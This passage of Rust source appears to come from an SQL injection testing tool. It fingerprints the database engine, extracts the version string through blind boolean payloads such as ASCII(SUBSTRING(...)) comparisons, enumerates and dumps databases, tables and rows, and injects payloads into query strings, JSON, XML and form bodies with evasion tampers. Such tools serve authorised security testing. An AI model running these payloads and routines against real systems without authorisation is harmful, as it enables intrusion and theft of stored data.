        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) {
        let findings_snapshot = self.state.read().await.findings().to_vec();
        if findings_snapshot.is_empty() {
            return;
        }
        // Unconfirmed-only snapshots (error `0.55 unconfirmed`) must not feed
        // DBMS guessing: `guess_from_findings` would fill `postgres` from a
        // weak pattern and trigger a doomed enumeration pass.
        if !has_confirmed_finding(&findings_snapshot) {
            return;
        }
        // Guess only from confirmed findings so a leading unconfirmed error
        // (dbms=`postgres` at 0.55) cannot shadow a confirmed boolean.
        let confirmed: Vec<Finding> = findings_snapshot
            .iter()
            .filter(|f| is_confirmed_finding(f))
            .cloned()
            .collect();
        // Explicit `--dbms` hint wins over guessing: fill immediately and skip
        // active probing (saves requests, honours operator knowledge).
        if let Some(hint) = self.dbms_hint_kind() {
            let mut st = self.state.write().await;
            st.fill_missing_dbms(hint);
            info!(
                target=%self.scrubber.scrub(target_str),
                dbms=%hint,
                "fingerprint from --dbms hint"
            );
            return;
        }
        if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&confirmed) {
            let mut st = self.state.write().await;
            st.fill_missing_dbms(kind);
            info!(
                target=%self.scrubber.scrub(target_str),
                dbms=%kind,
                "fingerprint guessed from findings"
            );
            return;
        }
        // Try banner extraction from evidences
        for f in &confirmed {
            if let Some((kind, ver)) = crate::dbms::fingerprint::extract_banner_version(&f.evidence)
            {
                let mut st = self.state.write().await;
                st.fill_missing_dbms(kind);
                info!(
                    target=%self.scrubber.scrub(target_str),
                    dbms=%kind,
                    version=%ver,
                    "fingerprint banner detected"
                );
                return;
            }
        }
        self.active_fingerprint_probe(
            target,
            target_str,
            marker_set,
            raw_request,
            baseline,
            effective_tampers,
            effective_opts,
        )
        .await;
    }

    /// Sends one true/false probe pair per [`crate::dbms::DbmsKind`] against
    /// the confirmed injection point until one confirms via the standard
    /// boolean true/false-vs-baseline heuristic ([`BooleanDetector::evaluate`]).
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn active_fingerprint_probe(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) {
        let (param, probe_target) = self.first_finding_param(target).await;
        let baseline_body = baseline.representative_body_str();
        let detector = BooleanDetector::new();
        // Seeded tamper RNG: one sequence per probe phase so `--seed` runs
        // build identical payloads; `None` preserves OS-random behaviour.
        let mut rng = crate::seeded_rng::make_rng(self.config.seed);
        for kind in [
            crate::dbms::DbmsKind::MySql,
            crate::dbms::DbmsKind::Postgres,
            crate::dbms::DbmsKind::MsSql,
            crate::dbms::DbmsKind::Oracle,
        ] {
            if self.cancel.is_cancelled() {
                return;
            }
            let candidate = crate::dbms::fingerprint::get_detector(kind);
            let (true_base, false_base) = candidate.fingerprint_probe();
            let true_payload = build_final_payload_with_rng(
                &true_base,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );
            let false_payload = build_final_payload_with_rng(
                &false_base,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );

            let true_spec = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &true_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.evasion.payload_opts,
            );
            let start = Instant::now();
            let true_resp = self.client.send_with_retry(true_spec, &self.cancel).await;
            let true_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            // Never score a transport/body error as `""` (similarity ~0 =>
            // false positive). Skip this DBMS candidate instead.
            let true_body = match true_resp {
                Ok(r) => match self.client.read_body_string_with_timeout(r).await {
                    Ok(b) => b,
                    Err(e) => {
                        warn!(error=%e, dbms=%kind, "fingerprint true body read failed, skipping");
                        continue;
                    }
                },
                Err(e) => {
                    warn!(error=%e, dbms=%kind, "fingerprint true probe failed, skipping");
                    continue;
                }
            };

            if self.cancel.is_cancelled() {
                return;
            }
            let false_spec = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &false_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.evasion.payload_opts,
            );
            let start = Instant::now();
            let false_resp = self.client.send_with_retry(false_spec, &self.cancel).await;
            let false_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let false_body = match false_resp {
                Ok(r) => match self.client.read_body_string_with_timeout(r).await {
                    Ok(b) => b,
                    Err(e) => {
                        warn!(error=%e, dbms=%kind, "fingerprint false body read failed, skipping");
                        continue;
                    }
                },
                Err(e) => {
                    warn!(error=%e, dbms=%kind, "fingerprint false probe failed, skipping");
                    continue;
                }
            };

            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                self.state.write().await.fill_missing_dbms(kind);
                info!(
                    target=%self.scrubber.scrub(target_str),
                    dbms=%kind,
                    "active fingerprint confirmed"
                );
                return;
            }
        }
    }

    /// Opt-in (`--extract`) version-string inference: length via `LENGTH()`
    /// binary search, then char-by-char `ASCII(SUBSTRING())` oracle.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_extraction(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        // Gate: unconfirmed 0.55 error findings alone must never trigger the
        // heavy boolean oracle (~270-700 req into `inference inconsistency`).
        // Require a boolean finding, an error with `extracted=yes`, or an
        // error with `bool_confirm=true`. Empty findings never qualify
        // (early `run_internal` gate already skips, this is defense in depth).
        {
            let snap = self.state.read().await.findings().to_vec();
            if snap.is_empty() {
                warn!("--extract requested but no findings — skipping");
                return Ok(());
            }
            if !is_extraction_eligible(&snap) {
                warn!(
                    "likely FP, extraction skipped (no boolean-confirmed or error-with-fragment finding)"
                );
                return Ok(());
            }
        }
        // Pick first finding's param as injection point for extraction
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        // Determine DBMS for extraction query (`--dbms` hint wins).
        // Guess from confirmed findings only (see fingerprint gating).
        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
            hint
        } else {
            let snap = self.state.read().await.findings().to_vec();
            let confirmed: Vec<Finding> = snap
                .iter()
                .filter(|f| is_confirmed_finding(f))
                .cloned()
                .collect();
            crate::dbms::fingerprint::guess_from_findings(&confirmed)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };
        #[allow(clippy::match_same_arms)]
        let version_query = match dbms_kind {
            crate::dbms::DbmsKind::MySql => "SELECT @@version",
            crate::dbms::DbmsKind::Postgres => "SELECT version()",
            crate::dbms::DbmsKind::MsSql => "SELECT @@version",
            crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
            crate::dbms::DbmsKind::Sqlite => "SELECT sqlite_version()",
            crate::dbms::DbmsKind::Unknown => "SELECT @@version",
        };

        // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client_clone = self.client.clone();
        let state_clone = Arc::clone(&self.state);
        let cancel_clone = self.cancel.clone();
        let target_str_clone = target_str.to_owned();
        let target_clone2 = target_for_extract.clone();
        let first_param_clone = first_param.clone();
        let marker_set_clone = marker_set.clone();
        let raw_request_clone = raw_request.as_ref().clone();

        // First, infer length via LENGTH(query) if possible (try lengths 1..64)
        // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
        // Seeded tamper RNG so `--seed` builds identical payloads.
        let mut rng = crate::seeded_rng::make_rng(self.config.seed);
        let mut inferred_len: usize = 0;
        for len_guess in 1..=64usize {
            if cancel_clone.is_cancelled() {
                break;
            }
            #[allow(clippy::match_same_arms)]
            let base_payload = match dbms_kind {
                crate::dbms::DbmsKind::MySql => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
                crate::dbms::DbmsKind::Postgres => {
                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                }
                crate::dbms::DbmsKind::MsSql => {
                    format!("' AND LEN(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Oracle => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Sqlite => {
                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                }
                crate::dbms::DbmsKind::Unknown => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
            };
            let payload = build_final_payload_with_rng(
                &base_payload,
                effective_tampers,
                &self.config.evasion.payload_opts,
                &mut rng,
            );
            // Retry logic: require 2 probes, treat as true only if majority true.
            // Transport/body errors are never scored (empty body => similarity
            // ~0 => false positive); a guess with no valid trial is skipped
            // without breaking so a transient blip cannot truncate inference.
            let mut true_count = 0usize;
            let mut valid_trials = 0usize;
            for _ in 0..2 {
                let spec = build_injection_spec_with_raw(
                    &target_clone2,
                    &target_str_clone,
                    &first_param_clone,
                    &payload,
                    &marker_set_clone,
                    raw_request_clone.as_ref(),
                    effective_opts,
                    &self.config.evasion.payload_opts,
                );
                let start = Instant::now();
                let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state_clone.write().await.increment_requests();
                let body = match resp {
                    Ok(r) => match client_clone.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, len_guess, "extraction probe body read failed, skipping trial");
                            continue;
                        }
                    },
                    Err(e) => {
                        // Cancelled must abort, never be scored or retried as transport noise.
                        if matches!(e, crate::http::client::ClientError::Cancelled) {
                            return Ok(());
                        }
                        warn!(error=%e, len_guess, "extraction probe failed, skipping trial");
                        continue;
                    }
                };
                valid_trials += 1;
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean,
                    ms,
                    100.0,
                );
                if diff.confidence < 0.4 {
                    true_count += 1;
                }
                // small jitter between retries
                if cancel_clone.is_cancelled() {
                    break;
                }
            }
            if valid_trials == 0 {
                warn!(
                    len_guess,
                    "extraction length probe inconclusive (transport errors), skipping guess"
                );
                continue;
            }
            let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
            // If we saw 0 true after 2 trials, length guess exceeded
            if !is_true {
                inferred_len = len_guess - 1;
                break;
            }
            if len_guess == 64 {
                inferred_len = 64;
            }
        }
        if inferred_len == 0 {
            warn!("length inference failed, falling back to 16");
            inferred_len = 16; // fallback with warning
        }
        info!(len=%inferred_len, "inferred version length");

        // Now extract string char by char via binary search oracle
        let engine = crate::extraction::engine::ExtractionEngine::new(
            crate::extraction::engine::ExtractionConfig::default(),
        );
        let dbms_for_closure = dbms_kind;
        let version_query_owned = version_query.to_owned();
        let baseline_body2 = baseline_body.clone();
        let baseline_mean2 = baseline_mean;
        let client_for_oracle = client_clone.clone();
        let state_for_oracle = state_clone.clone();
        let cancel_for_oracle = cancel_clone.clone();
        let target_for_oracle = target_clone2.clone();
        let param_for_oracle = first_param_clone.clone();
        let marker_for_oracle = marker_set_clone.clone();
        let raw_for_oracle = raw_request.as_ref().clone();

        let target_str_for_oracle = target_str_clone.clone();
        let tampers_for_oracle = effective_tampers.to_vec();
        let popts_for_oracle = self.config.evasion.payload_opts.clone();
        let seed_for_oracle = self.config.seed;
        let oracle = move |pos: usize, mid: u8| {
            let client = client_for_oracle.clone();
            let state = state_for_oracle.clone();
            let cancel = cancel_for_oracle.clone();
            let target = target_for_oracle.clone();
            let param = param_for_oracle.clone();
            let marker_set = marker_for_oracle.clone();
            let raw = raw_for_oracle.clone();
            let baseline_body = baseline_body2.clone();
            let version_query = version_query_owned.clone();
            let dbms_kind = dbms_for_closure;
            let target_str = target_str_for_oracle.clone();
            let tampers = tampers_for_oracle.clone();
            let popts = popts_for_oracle.clone();
            let opts = effective_opts;
            let seed = seed_for_oracle;
            async move {
                // build ASCII(SUBSTRING) >= mid payload
                #[allow(clippy::match_same_arms)]
                let base = match dbms_kind {
                    crate::dbms::DbmsKind::MySql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Postgres => format!(
                        "' AND ASCII(SUBSTRING(({version_query})::text,{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::MsSql => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Oracle => format!(
                        "' AND ASCII(SUBSTR(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Sqlite => format!(
                        "' AND UNICODE(SUBSTR(({version_query}),{},1))>={} --",
                        pos + 1,
                        mid
                    ),
                    crate::dbms::DbmsKind::Unknown => format!(
                        "' AND ASCII(SUBSTRING(({version_query}),{},1))>={} -- -",
                        pos + 1,
                        mid
                    ),
                };
                // Fresh RNG per oracle call from the run seed: deterministic
                // per `--seed`, independent of async scheduling order.
                let mut rng = crate::seeded_rng::make_rng(seed);
                let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut rng);
                // Use spec-based injection to preserve param location (Query/Body/Header/Cookie) and marker handling.
                // Transport/body errors are retried (bounded) then propagated
                // as `Err` — never scored as `""` (similarity ~0 => wrong bit).
                // The engine treats `Err` as an abstention/retry, so one
                // hiccup cannot corrupt a bit.
                let mut last_err: Option<String> = None;
                for _ in 0..3 {
                    let spec = build_injection_spec_with_raw(
                        &target,
                        &target_str,
                        &param,
                        &payload,
                        &marker_set,
                        raw.as_ref(),
                        opts,
                        &popts,
                    );
                    let start = Instant::now();
                    let resp = client.send_with_retry(spec, &cancel).await;
                    let ms = start.elapsed().as_secs_f64() * 1000.0;
                    state.write().await.increment_requests();
                    let body = match resp {
                        Ok(r) => match client.read_body_string_with_timeout(r).await {
                            Ok(b) => b,
                            Err(e) => {
                                warn!(error=%e, pos, mid, "extraction oracle body read failed, retrying");
                                last_err = Some(e.to_string());
                                continue;
                            }
                        },
                        Err(e) => {
                            warn!(error=%e, pos, mid, "extraction oracle probe failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    };
                    let diff = crate::detection::response_diff::diff_against_baseline(
                        &baseline_body,
                        &body,
                        baseline_mean2,
                        ms,
                        100.0,
                    );
                    // similar => true (>= mid)
                    return Ok::<bool, InjektError>(diff.confidence < 0.4);
                }
                Err::<bool, InjektError>(InjektError::Http(format!(
                    "extraction oracle transport failure at pos {pos} mid {mid}: {}",
                    last_err.unwrap_or_else(|| "unknown".to_owned())
                )))
            }
        };
        let extracted = match engine.extract(inferred_len, oracle, &cancel_clone).await {
            Ok(value) => value,
            Err(crate::error::InjektError::Cancelled) => {
                return Err(crate::error::InjektError::Cancelled);
            }
            Err(error) => {
                // Best-effort phase: a destabilized oracle (page changed
                // mid-run, WAF kicked in) must not nuke the detection
                // findings with a hard `inference inconsistency` failure.
                warn!(error=%error, "extraction oracle destabilized, keeping detection findings");
                return Ok(());
            }
        };
        let exposed = {
            use secrecy::ExposeSecret;
            extracted.expose_secret().to_owned()
        };
        info!(extracted=%Scrubber::hash_truncated(&exposed), len=%exposed.len(), "extraction done");
        // scrubbed hash logged, raw stored as SecretString zeroized after report
        self.state.write().await.push_extracted(extracted);
        Ok(())
    }

    /// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
    /// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
    /// same injection point as extraction.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_enumeration(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        // Reuse extraction context (`--dbms` hint wins over guessing).
        // Guess from confirmed findings only (see fingerprint gating).
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        let dbms_kind = if let Some(hint) = self.dbms_hint_kind() {
            hint
        } else {
            let snap = self.state.read().await.findings().to_vec();
            let confirmed: Vec<Finding> = snap
                .iter()
                .filter(|f| is_confirmed_finding(f))
                .cloned()
                .collect();
            crate::dbms::fingerprint::guess_from_findings(&confirmed)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };

        let detector = crate::dbms::fingerprint::get_detector(dbms_kind);

        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client = self.client.clone();
        let state = Arc::clone(&self.state);
        let cancel = self.cancel.clone();
        let target_str = target_str.to_owned();
        let marker_set = marker_set.clone();
        let raw_request_for_enum = raw_request.as_ref().clone();

        let start = self.config.enumeration.start.unwrap_or(0);
        let stop = self.config.enumeration.stop.unwrap_or(100);

        if self.config.enumeration.dbs {
            let query = detector.list_databases_query();
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "databases".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_db = self.config.enumeration.db.clone().unwrap_or_default();
        if self.config.enumeration.tables && !target_db.is_empty() {
            let query = detector.list_tables_query(&target_db);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "tables".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        let target_table = self.config.enumeration.table.clone().unwrap_or_default();
        if self.config.enumeration.columns && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.list_columns_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "columns".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.enumeration.dump && !target_db.is_empty() && !target_table.is_empty() {
            let columns: Vec<String> = self
                .config
                .enumeration
                .column
                .clone()
                .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
                .unwrap_or_default();
            let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "dump".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        if self.config.enumeration.count && !target_db.is_empty() && !target_table.is_empty() {
            let query = detector.count_rows_query(&target_db, &target_table);
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                "count".to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }

        for (flag, query, label) in [
            (
                self.config.enumeration.banner,
                detector.banner_query(),
                "banner",
            ),
            (
                self.config.enumeration.current_user,
                detector.current_user_query(),
                "current_user",
            ),
            (
                self.config.enumeration.current_db,
                detector.current_db_query(),
                "current_db",
            ),
            (
                self.config.enumeration.hostname,
                detector.hostname_query(),
                "hostname",
            ),
        ] {
            if !flag {
                continue;
            }
            let extracted = extract_enum_field(
                &client,
                &state,
                &cancel,
                &target_for_extract,
                &target_str,
                &first_param,
                &marker_set,
                &baseline_body,
                baseline_mean,
                query.clone(),
                label.to_owned(),
                raw_request_for_enum.as_ref(),
                effective_tampers,
                effective_opts,
                &dbms_kind,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                self.config.seed,
            )
            .await?;
            if let Some(extracted) = extracted {
                info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
                self.state
                    .write()
                    .await
                    .push_extracted(secrecy::SecretString::from(extracted));
            }
        }
        Ok(())
    }
}

fn inject_param(
    target: &TargetUrl,
    param: &TargetParameter,
    payload: &str,
    safe: &[char],
    skip_urlencode: bool,
) -> String {
    // naive: replace query param value
    let mut url = target.inner().clone();
    let mut pairs: Vec<(String, String)> = url
        .query_pairs()
        .map(|(k, v)| (k.into_owned(), v.into_owned()))
        .collect();
    let mut found = false;
    for (k, v) in &mut pairs {
        if k == &param.name {
            payload.clone_into(v);
            found = true;
        }
    }
    if !found {
        pairs.push((param.name.clone(), payload.to_owned()));
    }
    // Default path (no --safe-chars/--skip-urlencode): standard encoding,
    // byte-identical to the historical behaviour.
    if safe.is_empty() && !skip_urlencode {
        url.query_pairs_mut().clear();
        for (k, v) in pairs {
            url.query_pairs_mut().append_pair(&k, &v);
        }
        return url.to_string();
    }
    // Custom encoding: keys stay standard, values honour safe/skip.
    let query = pairs
        .iter()
        .map(|(k, v)| {
            let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
            format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
        })
        .collect::<Vec<_>>()
        .join("&");
    url.set_query(Some(&query));
    url.to_string()
}

#[allow(clippy::collapsible_if)]
fn inject_with_marker(target_str: &str, payload: &str, marker_set: &MarkerSet) -> String {
    let mut s = target_str.to_owned();
    if marker_set.asterisk {
        if s.contains('*') {
            // Replace only first occurrence to avoid over-broad replacement
            if let Some(pos) = s.find('*') {
                s.replace_range(pos..=pos, payload);
                return s;
            }
        } else {
            // Handle encoded asterisk %2A (case-insensitive) when URL is percent-encoded
            let lower = s.to_ascii_lowercase();
            if let Some(pos) = lower.find("%2a") {
                s.replace_range(pos..pos + 3, payload);
                return s;
            }
        }
    }
    if marker_set.section {
        // §payload§ -> replace inner
        if let Some(start) = s.find('§')
            && let Some(end) = s[start + '§'.len_utf8()..].find('§')
        {
            let sec_end = start + '§'.len_utf8() + end + '§'.len_utf8();
            s.replace_range(start..sec_end, payload);
            return s;
        }
    }
    if marker_set.double_brace && s.contains("{{") && s.contains("}}") {
        if let Some(start) = s.find("{{")
            && let Some(end) = s[start..].find("}}")
        {
            let brace_end = start + end + "}}".len();
            s.replace_range(start..brace_end, payload);
            return s;
        }
    }
    // fallback: append as query
    if s.contains('?') {
        format!("{s}&injekt={payload}")
    } else {
        format!("{s}?injekt={payload}")
    }
}

#[allow(dead_code)]
fn inject_param_or_marker(
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    payload: &str,
    marker_set: &MarkerSet,
) -> String {
    if marker_set.has_any() && param.name.starts_with("marker_") {
        inject_with_marker(target_str, payload, marker_set)
    } else {
        inject_param(target, param, payload, &[], false)
    }
}

#[allow(clippy::too_many_lines)]
fn inject_body_param(
    raw: Option<&crate::target::raw_request::RawRequest>,
    param: &TargetParameter,
    payload: &str,
    hpp: bool,
    safe: &[char],
    skip_urlencode: bool,
) -> (Method, String, http::HeaderMap) {
    let method = raw
        .and_then(|r| Method::from_bytes(r.method.as_bytes()).ok())
        .unwrap_or(Method::POST);
    let existing_body = raw.and_then(|r| r.body.as_deref());
    // Structured bodies: `json:/a/0/b` and `xml:Tag` params (see
    // `target::structured`) inject via path/tag helpers so nested JSON and
    // XML/SOAP flow as valid documents instead of urlencoded noise.
    // Multipart `name="field"` parts are replaced in place with the boundary
    // preserved.
    if let Some(body) = existing_body {
        let (kind, rest) = crate::target::structured::split_name(&param.name);
        match kind {
            crate::target::structured::StructuredKind::Json => {
                if let Some(injected) =
                    crate::target::structured::inject_json_path(body, rest, payload)
                {
                    return (
                        method,
                        injected,
                        headers_preserving_raw(raw, "application/json"),
                    );
                }
            }
            crate::target::structured::StructuredKind::Xml => {
                if let Some(injected) =
                    crate::target::structured::inject_xml_tag(body, rest, payload)
                {
                    let ct = raw
                        .and_then(|r| r.content_type())
                        .unwrap_or("application/xml");
                    let ct_static: &'static str = if ct.to_ascii_lowercase().contains("soap") {
                        "application/soap+xml"
                    } else {
                        "application/xml"
                    };
                    return (method, injected, headers_preserving_raw(raw, ct_static));
                }
            }
            crate::target::structured::StructuredKind::Form => {
                let ct = raw.and_then(|r| r.content_type()).unwrap_or_default();
                if ct.to_ascii_lowercase().contains("multipart/form-data")
                    && let Some(injected) = inject_multipart_field(body, &param.name, payload)
                {
                    return (method, injected, headers_preserving_raw_keep_ct(raw));
                }
            }
        }
    }
    // JSON bodies (`--data '{"a":1}'`): replace the key inside the object so
    // blind payloads flow as valid JSON instead of urlencoded noise.
    if let Some(body) = existing_body {
        let trimmed = body.trim();
        if trimmed.starts_with('{')
            && trimmed.ends_with('}')
            && let Ok(serde_json::Value::Object(mut obj)) =
                serde_json::from_str::<serde_json::Value>(trimmed)
        {
            obj.insert(
                param.name.clone(),
                serde_json::Value::String(payload.to_owned()),
            );
            let json_body =
                serde_json::to_string(&serde_json::Value::Object(obj)).unwrap_or_else(|_| {
                    format!("{{\"{}\":\"{payload}\"}}", param.name.replace('"', "\\\""))
                });
            let mut headers = http::HeaderMap::new();
            headers.insert(
                http::header::CONTENT_TYPE,
                http::HeaderValue::from_static("application/json"),
            );
            if let Some(r) = raw {
                for (k, v) in &r.headers {
                    if k.eq_ignore_ascii_case("content-type")
                        || k.eq_ignore_ascii_case("content-length")
                    {
                        continue;
                    }
                    if let (Ok(name), Ok(val)) = (
                        http::HeaderName::from_bytes(k.as_bytes()),
                        http::HeaderValue::from_str(v),
                    ) {
                        headers.insert(name, val);
                    }
                }
            }
            return (method, json_body, headers);
        }
    }
    if hpp {
        // HPP: keep original fields, append param=payload as duplicate.
        let body_str = hpp_body_str(existing_body, &param.name, payload);
        let mut headers = http::HeaderMap::new();
        headers.insert(
            http::header::CONTENT_TYPE,
            http::HeaderValue::from_static("application/x-www-form-urlencoded"),
        );
        if let Some(r) = raw {
            for (k, v) in &r.headers {
                if k.eq_ignore_ascii_case("content-type")
                    || k.eq_ignore_ascii_case("content-length")
                {
                    continue;
                }
                if let (Ok(name), Ok(val)) = (
                    http::HeaderName::from_bytes(k.as_bytes()),
                    http::HeaderValue::from_str(v),
                ) {
                    headers.insert(name, val);
                }
            }
        }
        return (method, body_str, headers);
    }
    let body_str = if let Some(body) = existing_body {
        // Preserve other body fields, replace only target param
        let mut pairs: Vec<(String, String)> = url::form_urlencoded::parse(body.as_bytes())
            .map(|(k, v)| (k.into_owned(), v.into_owned()))
            .collect();
        let mut found = false;
        for (k, v) in &mut pairs {
            if k == &param.name {
                payload.clone_into(v);
                found = true;
            }
        }
        if !found {
            pairs.push((param.name.clone(), payload.to_owned()));
        }
        // Default path: standard encoding. Custom path (--safe-chars/
        // --skip-urlencode): keys stay standard, values honour safe/skip.
        if safe.is_empty() && !skip_urlencode {
            url::form_urlencoded::Serializer::new(String::new())
                .extend_pairs(pairs)
                .finish()
        } else {
            pairs
                .iter()
                .map(|(k, v)| {
                    let ek: String = url::form_urlencoded::byte_serialize(k.as_bytes()).collect();
                    format!("{ek}={}", encode_with_safe_chars(v, safe, skip_urlencode))
                })
                .collect::<Vec<_>>()
                .join("&")
        }
    } else {
        format!(
            "{}={}",
            param.name,
            url::form_urlencoded::byte_serialize(payload.as_bytes()).collect::<String>()
        )
    };
    let mut headers = http::HeaderMap::new();
    headers.insert(
        http::header::CONTENT_TYPE,
        http::HeaderValue::from_static("application/x-www-form-urlencoded"),
    );
    // Preserve other headers from raw request (e.g., Host, User-Agent)
    if let Some(r) = raw {
        for (k, v) in &r.headers {
            if k.eq_ignore_ascii_case("content-type") || k.eq_ignore_ascii_case("content-length") {
                continue;
            }
            if let (Ok(name), Ok(val)) = (
